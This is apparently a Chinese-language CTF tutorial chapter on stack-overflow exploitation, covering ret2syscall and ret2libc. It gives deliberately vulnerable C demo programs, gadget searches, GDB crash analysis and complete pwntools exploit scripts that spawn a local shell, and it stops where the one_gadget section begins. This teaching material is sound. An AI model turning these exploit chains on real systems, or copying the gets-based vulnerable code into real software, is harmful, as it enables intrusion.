---
chapter: PWN
section: ret2libc / ret2syscall / ret2shellcode
order: 307
tags:
  - CTF
  - PWN
  - ROP
publish: true
---

# P7 ret2libc / ret2syscall / ret2shellcode
## ret2libc, ret2syscall & ret2shellcode

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P06-栈溢出原理与ret2win|P6]] · [[P03-ELF链接与延迟绑定|P3]] · [[P05-pwntools与GDB插件工具链|P5]]
> **本章目标**：回答 [[P06-栈溢出原理与ret2win|P6]] 留下的那个问题——程序里没有 `win` 函数时，控制了返回地址之后跳去哪；把三条经典路线 ret2syscall、ret2libc、ret2shellcode 各配一个从编译到 getshell 的完整 exploit，外加 one_gadget 这条捷径、三链的选型方法，以及 seccomp 沙箱禁掉 `execve` 时的 ORW 出口。

[[P06-栈溢出原理与ret2win|P6]]的 ret2win 有个前提：程序里恰好躺着一个"永远不该被调用"的 `win`。真实赛题的程序多半没有这种善意——返回地址已经能填成任意值，==接下来执行什么，得自己安排==。本章给出三个安排法：

- **ret2syscall**：不借任何函数，用 gadget 把寄存器逐个装好，直接执行一条 `syscall` 启动 `execve("/bin/sh", 0, 0)`；
- **ret2libc**：动态链接程序里现成躺着 `system`，先泄露它在 libc 里的真实地址，第二轮调 `system("/bin/sh")`；
- **ret2shellcode**：缓解机制允许时，把自己生成的机器码写进内存再跳过去执行。

三条路共享 [[P06-栈溢出原理与ret2win|P6]] 打下的全部地基：偏移怎么量、gadget 怎么串、对齐怎么补——本章一律一句带过配双链，不重讲。

## 1. 三条路线怎么选

| 路线 | 适用条件 | 不要求 | 交互轮数 |
| ---- | ---- | ---- | ---- |
| ret2syscall | 程序里有凑齐寄存器和 `syscall` 的 gadget——==静态链接的程序几乎必有== | libc 信息、输出通道、栈可执行 | 1 |
| ret2libc | 动态链接 + 程序里能借到输出函数（`puts`/`printf`）+ libc 版本可确定（附件或指纹检索） | 栈可执行 | 2 |
| one_gadget（ret2libc 的捷径） | 同 ret2libc 的泄露条件，且跳入时刻能满足它的约束 | 同上 | 2（第二轮只要一个地址） |
| ret2shellcode | NX 关闭（栈或某块内存可执行）+ 那块内存的地址可知（泄露、固定常量或关闭 ASLR） | 输出通道 | 1 |
| ORW（第 6 节） | seccomp 白名单里留着 `open`/`openat` 与 `read`/`write`——`seccomp-tools dump` 一看便知 | `execve` 可用 | 1–2 |

拿到一道题，按固定顺序问四个问题，答案直接指向路线：

1. **`file` 看静态还是动态**：`statically linked` 优先想 ret2syscall——gadget 海量，且不依赖任何运行期信息；
2. **checksec 看 NX**：NX 关才有 ret2shellcode 这条路；NX 开（现代默认）走前两条，==它们本来就是为对抗 NX 设计的==，因为执行的每一条指令都来自合法的可执行页；
3. **看输出通道**：程序里有没有能借来打印数据的 `puts@plt`/`printf@plt`——有，ret2libc 的泄露才成立；
4. **看附件**：题目附带 libc 文件吗——附带就走 [[P03-ELF链接与延迟绑定#6.6 题目自带 libc 时|P3 6.6]] 的流程，没附带练指纹检索。

第五种局面藏在运行期：程序里有 `prctl` 和一长段装过滤器的 BPF 代码——seccomp 沙箱，getshell 的三条路线全部作废，出口换成第 6 节的 ORW。

> [!info]- 为什么 NX 开着，前两条路线照样能用
> NX 挡的是"执行数据页上的字节"（机制 [[P04-Linux安全缓解机制|P4]]）。ret2syscall 和 ret2libc 的链上每一格都是==已有代码的地址==：gadget 在程序或 libc 的代码段里，`system` 在 libc 的代码段里，`syscall` 指令也在——没有任何一个字节需要在数据页上执行。这个思路就是 ROP（Return-Oriented Programming）名字的含义：把现成代码按"ret 串起来的片段"重新组织，[[P06-栈溢出原理与ret2win#4. 带参数的 win：第一个 gadget|P6 第 4 节]]的第一条 gadget 链已经演示过这个组织方式。

三条路线的实现都是同一副骨架：==P6 量出的偏移 + "跳去哪"的具体答案==。本章的演示程序全部沿用 P6 的布局与判读（无 Canary、无 PIE），偏移各处标明、量法不再重复；第 6 节起输入函数换用 `read`——它按字节数读取、没有 gets 的换行刹车（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]），payload 里出现 `\x00`、`\x0a` 都不再受限。

## 2. ret2syscall：不依赖任何泄露

### 2.1 目标：自己凑一次 execve

getshell 的本体是一条系统调用：

```text
execve("/bin/sh", NULL, NULL)
```

它按 x86-64 Linux 的 syscall 约定传参（[[04-汇编语言精要#10. 系统调用：程序开口找内核办事|通用基础 04 章第 10 节]]整理过完整约定表）：调用号放 rax，参数依次 rdi、rsi、rdx。所以目标是让四个寄存器同时就位——==rax = 59（execve 的调用号）、rdi = "/bin/sh" 的地址、rsi = 0、rdx = 0==——然后执行 `syscall` 指令。

难点在装载方式。ret 只动 rsp 和 rip，不碰参数寄存器（[[P06-栈溢出原理与ret2win#4.1 问题：参数在 rdi 里|P6 4.1]]）；要"往 rax 装一个数再继续"，能用的只有形如 `pop rax ; ret` 的 gadget：从栈上把数弹进寄存器，再 ret 接下一段。于是问题变成一道检索题：==程序里有没有把 59、字符串地址、两个 0 分别装进 rax、rdi、rsi、rdx 的 pop 片段，和一条 `syscall`==。寄存器的分工与传参约定 [[R03-x86与x64汇编精要复习|R03]] 复习。

### 2.2 演示程序：静态链接

```c
/* sys_vuln.c —— ret2syscall 演示程序（x86-64 Linux，静态链接） */
#include <stdio.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

const char sh[] = "/bin/sh";   /* 常量串，供检索定位（P5 的 vuln5 同款做法） */

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);             /* 漏洞点 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -static sys_vuln.c -o sys_vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccUlESUU.o: in function `vuln':
sys_vuln.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
```

`-static` 把 libc 的代码整个并进可执行文件，产物有 800 KB 上下——换来的是==海量的 gadget 储备==，这正是选 ret2syscall 的前提。checksec 判读：

```bash
pwn checksec ./sys_vuln
```

输出：

```
[*] '/home/hua/p7/sys_vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

> [!warning] 静态程序的 "Canary found" 往往是误报
> checksec 靠符号表里有没有 `__stack_chk_fail` 判断金丝雀（[[P01-PWN导论与缓解机制全景#3. 现代缓解机制全景|P1 第 3 节]]提过判据）。静态链接把 glibc 整个装了进来，glibc 内部自己用这个函数，符号自然在表里——==不代表 vuln 开了保护==。判断某个函数有没有金丝雀，看它的反汇编里有没有读写 `%fs:0x28` 的检查。对动态链接的程序这条误报基本不出现（[[P06-栈溢出原理与ret2win#1.1 示例程序与编译|P6 1.1]]的判读照旧）。

反汇编确认漏洞函数干净、并量偏移（量法 [[P06-栈溢出原理与ret2win#2. 算偏移的两种方法|P6 第 2 节]]，x86-64 Linux / System V AMD64 ABI）：

```bash
objdump -d -M intel sys_vuln | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
0000000000401965 <vuln>:
  401965:	f3 0f 1e fa          	endbr64
  401969:	55                   	push   rbp
  40196a:	48 89 e5             	mov    rbp,rsp
  40196d:	48 83 ec 20          	sub    rsp,0x20
  401971:	bf 18 70 48 00       	mov    edi,0x487018
  401976:	b8 00 00 00 00       	mov    eax,0x0
  40197b:	e8 c0 37 00 00       	call   405140 <_IO_printf>
  401980:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401984:	48 89 c7             	mov    rdi,rax
  401987:	e8 74 99 00 00       	call   40b300 <_IO_gets>
  40198c:	90                   	nop
  40198d:	c9                   	leave
  40198e:	c3                   	ret
```

两处值得读：`buf` 在 `rbp-0x20`，偏移 40，与 P6 同布局；==反汇编里没有 `%fs:0x28`==，"Canary found" 确系误报。另外注意调用形态——静态程序没有 PLT，`call` 直接落进文件内部的 `_IO_printf`/`_IO_gets`：==静态程序里"从 libc 泄露地址"这个话题整个消失==，能利用的只剩程序自带的 gadget 和字符串。

### 2.3 把五件套搜齐

需要的清单：`pop rax ; ret`、装 rdi 的片段、装 rsi 的片段、装 rdx 的片段、`syscall`、`"/bin/sh"` 的地址。静态程序 gadget 上万条，==先全量落盘再反复 grep==，省得每改一个正则就重扫一遍：

```bash
ROPgadget --binary sys_vuln > gadgets.txt 2>/dev/null
grep -E ": pop (rax|rdi|rsi|rdx) ; ret$" gadgets.txt
```

输出：

```
0x000000000042ae03 : pop rax ; ret
```

==朴素版里只有 `pop rax ; ret` 一条，rdi/rsi/rdx 的朴素版一条都没有==——glibc 2.34 移除 `__libc_csu_init` 后的常态（[[P06-栈溢出原理与ret2win#4.2 ROPgadget 搜 gadget|P6 4.2]]的折叠框记过这件事）。放宽条件，搜"带搭头的"变体：

```bash
grep -E ": pop (rdi|rsi|rdx) ; (pop [a-z0-9]+|xor [a-z]+, [a-z]+)( ; pop [a-z0-9]+)* ; ret$" gadgets.txt
```

输出：

```
0x000000000040232b : pop rdi ; pop rbp ; ret
0x00000000004748ca : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000402329 : pop rsi ; pop r15 ; pop rbp ; ret
0x00000000004026d3 : pop rsi ; pop rbp ; ret
0x0000000000443c89 : pop rsi ; xor rax, rdx ; pop r15 ; pop rbp ; ret
```

五条候选，逐条挑：

- 装 rdi 取 `0x40232b`（`pop rdi ; pop rbp ; ret`）：rdi 弹到目标值，rbp 弹一个废值；
- 装 rsi 取 `0x4026d3`（`pop rsi ; pop rbp ; ret`），同理；
- 装 rdx 取 `0x4748ca`——它顺带 `xor eax, eax` ==把 rax 清零==，还连弹四个寄存器；
- 剩下两条同样能用：`0x402329` 是经典的 `pop rsi ; pop r15 ; pop rbp ; ret`，多弹的寄存器各垫一个废值即可；`0x443c89` 里 `xor rax, rdx` 会拿未知的 rdx 污染 rax，依赖最多，留给练习。

> [!info]- "双弹"：多弹出的寄存器垫废值
> 需求只是"rsi = 0"，gadget 却是 `pop rsi ; pop r15 ; pop rbp ; ret`——ret 之前弹几个寄存器，payload 里就依次跟几个 8 字节：第一个给 rsi，其余全是废值（填 0 最省心）。==用"链变长几格"换"有 gadget 可用"==，这笔账永远是划算的。反过来说，读别人的 payload 看到"地址后面跟几个 0"，先数它前面那条 gadget 弹几个寄存器，就明白每个 0 给了谁。

`syscall` 一条就够——它排在链尾，`execve` 成功后进程已经被替换，==不会返回，`syscall ; ret` 都不需要==：

```bash
grep -E ": syscall( ; ret)?$" gadgets.txt
```

输出：

```
0x00000000004012fa : syscall
```

最后是 `"/bin/sh"` 的地址。pwntools 直接在文件里检索字节串（`ELF` 的用法 [[P05-pwntools与GDB插件工具链#4. ELF：把二进制当数据库查|P5 第 4 节]]），ROPgadget 也能按字符串搜：

```bash
ROPgadget --binary sys_vuln --string "/bin/sh"
```

输出：

```
Strings information
============================================================
0x0000000000487010 : /bin/sh
```

0x487010 正是源码里那个 `const char sh[]`。

> [!info]- 为什么要自己在源码里放一个 "/bin/sh"
> 静态链接按需链入目标文件：程序没引用 `system` 一族，glibc 里那份 `"/bin/sh"` 就根本不会进映像。演示程序放一个常量串是[[P05-pwntools与GDB插件工具链#1. 本章的工具与演示程序|P5]] vuln5 的老做法。真实静态题里没有现成串时，标准解法是==两段链==：第一段先借程序里的输入函数（`gets`/`read`）把 `"/bin/sh\0"` 写进一个地址固定的位置（非 PIE 的 bss，[[R04-可执行文件格式ELF与PE|R04]]讲过怎么查），第二段再拼 syscall 链，rdi 指向 bss 里那个地址。

五件套齐了，登记成常量：rax 用 `0x42ae03`，rdi 用 `0x40232b`，rsi 用 `0x4026d3`，rdx 用 `0x4748ca`，syscall 用 `0x4012fa`，`"/bin/sh"` 在 `0x487010`。地址以自己编译的产物为准。

### 2.4 拼链与 getshell

栈布局（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）：

```asm
;   [40 字节填充   ]   填满 buf 与 saved rbp
;   [0x4748ca     ]   ← vuln 的 ret 落在这里：rdx=0，顺带 rax 被清零
;   [0 ×5         ]   rdx 的 0 + rbx/r12/r13/rbp 的废值
;   [0x4026d3     ]   rsi=0
;   [0 ×2         ]   rsi 的 0 + rbp 的废值
;   [0x40232b     ]   rdi="/bin/sh"
;   [0x487010     ]
;   [0            ]   rbp 的废值
;   [0x42ae03     ]   rax=59（execve 的调用号）
;   [59           ]
;   [0x4012fa     ]   syscall：execve("/bin/sh", 0, 0) 开跑
```

==顺序不是随便排的==：rdx 那条 gadget 里的 `xor eax, eax` 会清掉 rax，所以它必须排在"装 59"之前——==拼链时把每条 gadget 的副作用读一遍，谁覆盖谁要有数==。另一个顺带的好处：==这条链绕开了 P6 第 5 节的 16 字节对齐问题==——链上没有进入任何 libc 函数，`syscall` 直接切内核，内核不管栈对齐。

```python
#!/usr/bin/env python3
# exp_syscall.py —— ret2syscall：execve("/bin/sh", 0, 0)
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

OFFSET  = 40          # buf 在 rbp-0x20：32 字节 buf + 8 字节 saved rbp
POP_RDX = 0x4748ca    # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
POP_RSI = 0x4026d3    # pop rsi ; pop rbp ; ret
POP_RDI = 0x40232b    # pop rdi ; pop rbp ; ret
POP_RAX = 0x42ae03    # pop rax ; ret
SYSCALL = 0x4012fa    # syscall
BINSH   = 0x487010    # "/bin/sh"

payload = flat(
    b'A' * OFFSET,
    POP_RDX, 0, 0, 0, 0, 0,   # rdx = 0；rax 被这条顺带清零，59 留到后面再装；4 个废值弹进 rbx/r12/r13/rbp
    POP_RSI, 0, 0,            # rsi = 0；废值弹进 rbp
    POP_RDI, BINSH, 0,        # rdi = "/bin/sh"；废值弹进 rbp
    POP_RAX, 59,              # rax = 59
    SYSCALL,
)

io = process('./sys_vuln')
io.recvuntil(b'input> ')
io.sendline(payload)
time.sleep(0.5)                    # 等 gets 把 payload 这行读完，再发 shell 命令
io.sendline(b'cat flag.txt; echo p7_shell_ok')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

```bash
python3 exp_syscall.py
```

输出：

```
[x] Starting local process './sys_vuln'
[+] Starting local process './sys_vuln': pid 4774
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 26B
[x] Receiving all data: 38B
[+] Receiving all data: Done (38B)
[*] Process './sys_vuln' stopped with exit code 0 (pid 4774)
flag{p7_getshell_via_rop}
p7_shell_ok
```

`syscall` 执行后原进程被 `execve` 替换成 `/bin/sh`，shell 从同一个标准输入接着读命令，`cat flag.txt` 打出了 flag。==整条链一次交互完成，没有泄露、没有版本匹配==——这是 ret2syscall 最省事的地方，代价是它依赖"程序自带全部 gadget"，==动态链接的小程序凑不齐这套零件==，那时就要靠 libc 出场，也就是下一节。

> [!warning] 发给 shell 的命令要等它起来
> exp 里 payload 与 `cat flag.txt` 之间隔了 0.5 秒，不是可有可无的装饰。gets 的底层 `read` 会把管道里"此刻已有"的字节一并读进 stdio 缓冲（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]讲过停止规则，这里是它的进阶形态）：命令若赶在 payload 后面同一批到达，会被一起读进缓冲，==execve 一换进程映像，缓冲就丢了==，新 shell 什么也收不到。间隔之后命令留在管道里，shell 接管标准输入时自然读到。本章后面两条路线的 exp 都遵守同一个节奏。

## 3. ret2libc：两次交互范式

### 3.1 思路：泄露、算基址、二次打击

动态链接的程序自身代码短，搜不出 ret2syscall 需要的成套零件；但它链接着一个 gadget 与函数的大本营——libc。问题只剩==libc 装在哪==：ASLR 每次运行都换基址（[[P04-Linux安全缓解机制|P4]]），写死的地址落不了地。ret2libc 的解法是把利用拆成两轮：

1. **第一轮**：借程序里的输出函数，把某个 libc 函数的真实地址打印出来（这个手法叫 ret2plt，[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来|P3 第 4 节]]完整讲过原理——GOT 槽位里躺着解析后的真实地址，把槽位地址当参数调 `puts@plt` 就能把它打出来）；
2. **算基址**：真实地址减去该函数在这版 libc 里的偏移，得到基址，==先做页对齐校验==——这不是礼仪，是排错的第一道闸；
3. **第二轮**：基址加上 `system` 与 `"/bin/sh"` 的偏移，调 `system("/bin/sh")`。

$$\text{libc 基址} = \text{泄露的真实地址} - \text{该函数在这版 libc 里的偏移} \tag{7.1}$$

$$\text{目标地址} = \text{基址} + \text{目标函数的偏移} \tag{7.2}$$

"这版 libc"四个字是全部难度所在：偏移表随版本变，确定版本的完整流程（附件、低 12 位指纹、LibcSearcher）[[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配|P3 第 6 节]]已经讲全。本地演示直接拿系统 libc 充当题目附件。这种"先泄露一轮、拿泄露值再打一轮"的形态 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程|P1 第 2 节]]预告过，[[P09-格式化字符串漏洞|P9]]、[[P11-Canary绕过与GOT攻击|P11]] 都是同型。

### 3.2 演示程序

```c
/* libc_vuln.c —— ret2libc 演示程序：动态链接，没有 win 函数（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);

/* 演示程序自备一段 pop rdi ; ret（P6 4.2 的做法） */
void gadget(void) {
    __asm__("pop %rdi\n\tret");
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);             /* 漏洞点 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector libc_vuln.c -o libc_vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/cc6oPSKn.o: in function `vuln':
libc_vuln.c:(.text+0x30): warning: the `gets' function is dangerous and should not be used.
```

```bash
pwn checksec ./libc_vuln
```

输出：

```
[*] '/home/hua/p7/libc_vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

动态链接、NX 开、无 Canary、无 PIE——ret2libc 的标准开局。第一轮能用的地址必须==来自程序自身==（基址固定），先看程序自身有多少可用片段：

```bash
ROPgadget --binary libc_vuln --only "pop|ret"
nm libc_vuln | grep -E ' T (main|vuln|gadget)$'
```

输出：

```
Gadgets information
============================================================
0x000000000040117d : pop rbp ; ret
0x000000000040119e : pop rdi ; ret
0x000000000040101a : ret
0x000000000040105a : ret 0xffff

Unique gadgets found: 4
0000000000401196 T gadget
00000000004011cd T main
00000000004011a3 T vuln
```

`pop rdi ; ret` 在 0x40119e，裸 `ret` 在 0x40101a——前者装参数，后者就是 [[P06-栈溢出原理与ret2win#5.3 三种修法|P6 5.3]] 的对齐垫片，马上要用。偏移照旧是 40。

> [!info]- 第一轮为什么只能用程序自己的地址，以及 gadget 的来源
> 第一轮发生时 libc 基址还未知，libc 里的 gadget 全是"基址 + 偏移"的未知数，==只有程序自身的地址（非 PIE 固定）能写进 payload==——这是个先有鸡还是先有蛋的问题，答案就是分两轮：第一轮用程序自己的零件拿到基址，第二轮起就可以动用 libc 的零件。gadget 的来源预期管理：这个演示程序的 `pop rdi ; ret` 来自源码里那段内联汇编（[[P06-栈溢出原理与ret2win#4.2 ROPgadget 搜 gadget|P6 4.2]]的同款做法）；真实赛题里，老 glibc 编译的程序几乎必带 `__libc_csu_init` 一族片段，新程序则靠自身代码量或 libc——==一旦基址到手==，[[P03-ELF链接与延迟绑定|P3]] 说的"libc 是 gadget 大本营"立刻兑现，3.6 的折叠框演示了搜法。

### 3.3 第一轮：借 puts 打出真实地址

链的形状：

```asm
; 第一轮（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）
;   [40 字节填充      ]  填满 buf 与 saved rbp
;   [pop rdi ; ret    ]  ← vuln 的 ret 落在这里
;   [puts@got 的地址  ]  ← pop rdi 把它弹进 rdi：puts 打印这个槽位的内容
;   [puts@plt 的地址  ]  ← gadget 的 ret 落进 puts
;   [main 的地址      ]  ← puts 的返回地址：回到 main，再来一轮
```

三个地址全部来自程序自身，pwntools 一行查齐（`e.got['puts']`、`e.plt['puts']`、`e.symbols['main']`，[[P05-pwntools与GDB插件工具链#4. ELF：把二进制当数据库查|P5 第 4 节]]）。返回地址槽之后接 `main`，是为了==打完这一轮把控制流送回开头==，vuln 会再次执行、再次等一行输入——第二轮的入口。

这轮链上没有垫 ret，两个"恰好"让它能活：

- 进入 `puts` 那一刻 rsp 的 16 余数是 0 而不是约定的 8——差 8，但 ==puts 的执行路径上没有 movaps 这类整块访存指令，侥幸不炸==（[[P06-栈溢出原理与ret2win#5.2 崩溃现场|P6 5.2]] 的结论原样适用）；
- puts 返回时弹出 `main`，main 的入口 rsp 余数恰好回到约定的 8，==重入的 main 不带病运行==。

泄露回来的数据这样解（收发函数 [[P05-pwntools与GDB插件工具链#3. 连接与输入输出：process、remote 与一套收发函数|P5 第 3 节]]）：

```python
leak = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
```

libc 地址最高两个字节是 `00 00`，puts 打到 `\0` 就停，==实际收到 6 个字节==，`ljust` 给高位补零（[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来|P3 第 4 节]]记过这条）。

### 3.4 算基址与页对齐校验

用 7.1 把基址减回来，==立刻检查低 12 位是不是 0==：

```python
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)   # 本地演示：拿系统 libc 当题目附件
base = leak - libc.symbols['puts']
assert base & 0xfff == 0, '基址没有页对齐，泄露或偏移有错'
```

内存按页管理，libc 的装载基址低 12 位恒为 0，所以泄露值低 12 位就该等于偏移低 12 位（[[P03-ELF链接与延迟绑定#6.3 方法二：双符号偏移差指纹|P3 6.3]]的原理与判据）。==减完不是 0x000 结尾，说明收漏了字节或偏移用错了版本==——在往下走之前拦住它，比打到第二轮莫名其妙崩掉好排查得多。手头的数字可以对账：本章 libc 的 puts 偏移 0x8e860，泄露值 0x7c26acc8e860，减出基址 0x7c26acc00000，低三位十六进制 0x000，与 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]的演示数字逐位吻合。

### 3.5 第二轮：system("/bin/sh") 与对齐垫片

第二轮调 `system("/bin/sh")`，链形与第一轮同族，==多垫一格裸 ret==：

```asm
; 第二轮（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）
;   [40 字节填充      ]  填满 buf 与 saved rbp
;   [pop rdi ; ret    ]  ← vuln 的 ret 落在这里
;   ["/bin/sh" 的地址 ]  ← pop rdi 弹进 rdi（基址 + 偏移算出的运行期地址）
;   [裸 ret 的地址    ]  ← 对齐垫片：多拨一格 rsp，把差的那 8 字节补回来
;   [system 的地址    ]  ← 垫片的 ret 落进 system
```

为什么非垫不可，先看不垫的下场。对照组只改一行——第二轮链里去掉 `RET`：

```python
io.sendlineafter(b'input> ', flat(b'A' * OFFSET, POP_RDI, binsh, system))   # 没有垫 ret
```

完整脚本的运行结果：

```bash
python3 exp_libc_noret.py
```

输出：

```
[x] Starting local process './libc_vuln'
[+] Starting local process './libc_vuln': pid 4778
libc base = 0x7e2132e00000
EOF：程序在 system 内部崩掉，shell 没起来
[*] Stopped process './libc_vuln' (pid 4778)
```

泄露、算基址都成功了，程序死在 system 内部。抓现场（payload 文件离线生成——gdb 默认关 ASLR，基址固定为 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]见过的 0x7ffff7c00000，第二轮地址才能离线算好写进文件）：

```
# gdb_noret.cmds
set pagination off
set confirm off
run < p_noret.bin
x/i $rip
info registers rsp rip
p/d ((unsigned long)$rsp) % 16
bt
quit
```

```bash
gdb -q -batch -x gdb_noret.cmds ./libc_vuln
```

输出：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
input> ……
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c5be95 in do_system (line=0x7ffff7ddb799 "/bin/sh") at ../sysdeps/posix/system.c:117
=> 0x7ffff7c5be95 <do_system+101>:	movaps %xmm1,(%rsp)
rsp            0x7fffffffddc8      0x7fffffffddc8
rip            0x7ffff7c5be95      0x7ffff7c5be95 <do_system+101>
$1 = 8
#0  0x00007ffff7c5be95 in do_system (line=0x7ffff7ddb799 "/bin/sh") at ../sysdeps/posix/system.c:117
#1  0x00000001f7fc0000 in ?? ()
#2  0x00000000004011cd in vuln ()
……（后面几帧落在已被覆盖的旧栈数据上，回溯在此终止）
```

三样证据与 [[P06-栈溢出原理与ret2win#5.2 崩溃现场|P6 5.2]] 的现场完全同构：出错指令是 `movaps %xmm1,(%rsp)`，rsp 除 16 余 8，回溯显示 system 确实被调进来了（参数 line 还正是 `"/bin/sh"`——==链本身是通的，只差对齐==）。成因在 [[P06-栈溢出原理与ret2win#5.1 差 8 字节从哪来|P6 5.1]] 推过：链上从 ret 落地到跳进目标函数，rsp 被拨了几格决定入口余数——==这条链是偶数格，余数不变，差 8；垫一格裸 ret 变奇数格，恰好补齐==。第一轮能活是侥幸（puts 无 movaps），第二轮 system 一族路径上固定有 movaps，==差 8 必撞，不靠运气==。

### 3.6 完整 exploit

```python
#!/usr/bin/env python3
# exp_libc.py —— ret2libc：泄露 puts 真实地址 → 算 libc 基址 → system("/bin/sh")
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

e    = ELF('./libc_vuln', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)   # 本地演示：拿系统 libc 当题目附件

OFFSET  = 40
POP_RDI = 0x40119e    # pop rdi ; ret
RET     = 0x40101a    # 裸 ret：第二轮的对齐垫片

io = process('./libc_vuln')

# ---- 第一轮：puts(puts@got) 打出 puts 的真实地址，随后回到 main ----
io.recvuntil(b'input> ')
io.sendline(flat(b'A' * OFFSET, POP_RDI, e.got['puts'], e.plt['puts'], e.symbols['main']))

leak = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
base = leak - libc.symbols['puts']
print('泄露的 puts 地址 =', hex(leak))
print('推算的 libc 基址 =', hex(base), '| 低 12 位 =', hex(base & 0xfff))

system = base + libc.symbols['system']
binsh  = base + next(libc.search(b'/bin/sh\x00'))
print('system 真实地址  =', hex(system))
print('/bin/sh 真实地址 =', hex(binsh))

# ---- 第二轮：system("/bin/sh")，链上多垫一格 ret 补 16 字节对齐 ----
io.sendlineafter(b'input> ', flat(b'A' * OFFSET, POP_RDI, binsh, RET, system))
time.sleep(0.5)                    # 等 gets 把 payload 这行读完，再发 shell 命令
io.sendline(b'cat flag.txt; echo p7_shell_ok')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

```bash
python3 exp_libc.py
```

输出：

```
[x] Starting local process './libc_vuln'
[+] Starting local process './libc_vuln': pid 4796
泄露的 puts 地址 = 0x7c26acc8e860
推算的 libc 基址 = 0x7c26acc00000 | 低 12 位 = 0x0
system 真实地址  = 0x7c26acc5c2e0
/bin/sh 真实地址 = 0x7c26acddb799
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 26B
[x] Receiving all data: 38B
[+] Receiving all data: Done (38B)
[*] Stopped process './libc_vuln' (pid 4796)
flag{p7_getshell_via_rop}
p7_shell_ok
```

两个地址与偏移可以对账：`0x7c26acc5c2e0 − 0x7c26acc00000 = 0x5c2e0`（system 的偏移），`0x7c26acddb799 − 0x7c26acc00000 = 0x1db799`（`"/bin/sh"` 的偏移）——与 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]查过的偏移表一致。`recvall` 收到 flag 和标记，==第二轮 shell 命令正常执行==。

> [!info]- sendlineafter 与 recvuntil：两轮之间的时序
> 第一轮发送前用 `recvuntil(b'input> ')` 等提示符，第二轮改用 `sendlineafter(b'input> ', payload)`——它是"等标记再发"的合体写法。两轮之间==必须先收完泄露行再发第二轮==：泄露行是 puts 打在轮与轮之间的，若先发第二轮再收，第二轮 payload、泄露行、main 重印的提示符会挤在一起，`recvline` 解析出的"泄露"可能混着别的内容。==一轮一清：每轮的输出读完再喂下一轮的输入==，远程 Socket 上的输出分片与时序更乱，这个纪律在远程更关键（连接管理 [[P05-pwntools与GDB插件工具链#3. 连接与输入输出：process、remote 与一套收发函数|P5 第 3 节]]）。

> [!info]- "/bin/sh" 在 libc 里怎么定位
> `libc.search(b'/bin/sh\x00')` 在文件里检索字节串，返回偏移；不上 pwntools 就用 `strings -t x libc.so.6 | grep '/bin/sh'` 手算，文件偏移与虚拟地址在这类共享库里数值相同（[[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]核对过）。system 的偏移同理，`readelf -sW` 或 `libc.symbols['system']` 都行。

> [!info]- 第二轮起，gadget 也可以从 libc 拿
> 基址到手后，libc 里的任何片段都能用"基址 + 偏移"访问。全量落盘后检索：
>
> ```bash
> ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 > g_libc.txt 2>/dev/null
> grep -m3 ": pop rdi ; ret$" g_libc.txt
> ```
>
> 输出：
>
> ```
> 0x000000000011b9fa : pop rdi ; ret
> ```
>
> 于是第二轮的 `POP_RDI` 也可以写成 `base + 0x11b9fa`，效果等价。本题的程序自带 `pop rdi ; ret`，用哪个都行；程序自身搜不到零件时，这一手就是唯一出路。

## 4. one_gadget：一个地址的捷径

